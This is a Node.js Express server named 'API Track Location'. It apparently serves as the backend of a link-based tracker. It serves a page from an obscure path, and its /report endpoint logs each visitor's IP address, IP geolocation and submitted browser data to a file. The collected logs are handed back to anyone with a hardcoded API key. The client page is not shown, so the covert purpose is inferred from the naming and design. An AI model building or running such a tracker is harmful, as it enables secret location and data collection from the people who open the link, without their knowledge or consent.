const express = require('express');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const app = express();
const port = 8080;

const logFile = path.join(__dirname, 'logs.json');
const API_KEY = "xksbaibbakokebhxnnlspoxjennxuw";

// Serve static files (CSS, JS, etc.)
app.use('/xjskd', express.static(path.join(__dirname, 'public')));
app.use(express.json());

app.get('/xjskd', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/', (req, res) => {
  res.json({
    author: "Xzin Andreass",
    project: "API Track Location",
    description: "TLS TEAM"
  });
});

app.get('/logs', (req, res) => {
  const key = req.headers['x-api-key'];
  if (key !== API_KEY) {
    return res.status(403).json({ error: 'Unauthorized' });
  }

  if (fs.existsSync(logFile)) {
    const data = fs.readFileSync(logFile, 'utf8');
    try {
      const parsed = JSON.parse(data);
      res.status(200).json(parsed);
    } catch {
      res.status(500).json({ error: 'Failed to parse logs.json' });
    }
  } else {
    res.status(404).json({ error: 'Log file not found' });
  }
});

// Handle POST request to track user data
app.post('/report', async (req, res) => {
  const data = req.body;
  try {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const geo = await axios.get(`http://ip-api.com/json/${ip}`);
    const newEntry = {
      timestamp: new Date().toISOString(),
      ip,
      geo: geo.data,
      browserData: data
    };

    let logs = [];
    if (fs.existsSync(logFile)) {
      const fileData = fs.readFileSync(logFile, 'utf8');
      try {
        logs = JSON.parse(fileData);
      } catch {
        logs = [];
      }
    }

    // Reset logs jika data terakhir lebih dari 10 menit lalu
    if (logs.length > 0) {
      const lastTimestamp = new Date(logs[logs.length - 1].timestamp);
      const now = new Date();
      const diffMs = now - lastTimestamp; // milidetik
      const diffMinutes = diffMs / 1000 / 60;

      if (diffMinutes > 10) {
        logs = [];
      }
    }

    logs.push(newEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));

    console.log('Data tracked:', newEntry);
    res.sendStatus(200);
  } catch (err) {
    console.error('Error:', err.message);
    res.sendStatus(500);
  }
});


app.listen(port, () => {
  console.log(`Server running at http://127.0.0.1:${port}`);
});
